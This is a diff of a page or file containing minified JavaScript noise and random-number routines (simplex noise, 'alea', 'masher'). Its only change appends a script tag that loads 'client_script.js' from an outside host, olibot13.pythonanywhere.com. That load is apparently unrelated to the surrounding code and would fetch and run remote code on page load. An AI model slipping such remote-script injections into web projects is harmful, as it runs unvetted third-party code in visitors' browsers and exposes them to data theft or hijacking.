@@ -46,4 +46,4 @@ d=0);var n=w-k+G3;var B=r-y+G3,F=v-u+G3;b=w-q+2*G3;var C=r-D+2*G3,G=v-d+2*G3;f=w
 (w+n+b+l)}};function buildPermutationTable(b){var e,f=new Uint8Array(256);for(e=0;256>e;e++)f[e]=e;for(e=0;255>e;e++){var m=e+~~(b()*(256-e)),h=f[e];f[e]=f[m];f[m]=h}return f}SimplexNoise._buildPermutationTable=buildPermutationTable;
 function alea(){var b=0,e=0,f=0,m=1,h=masher();b=h(" ");e=h(" ");f=h(" ");for(var l=0;l<arguments.length;l++)b-=h(arguments[l]),0>b&&(b+=1),e-=h(arguments[l]),0>e&&(e+=1),f-=h(arguments[l]),0>f&&(f+=1);h=null;return function(){var h=2091639*b+2.3283064365386963E-10*m;b=e;e=f;return f=h-(m=h|0)}}
 function masher(){var b=4022871197;return function(e){e=e.toString();for(var f=0;f<e.length;f++){b+=e.charCodeAt(f);var m=.02519603282416938*b;b=m>>>0;m-=b;m*=b;b=m>>>0;m-=b;b+=4294967296*m}return 2.3283064365386963E-10*(b>>>0)}};
-</script>
+</script><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
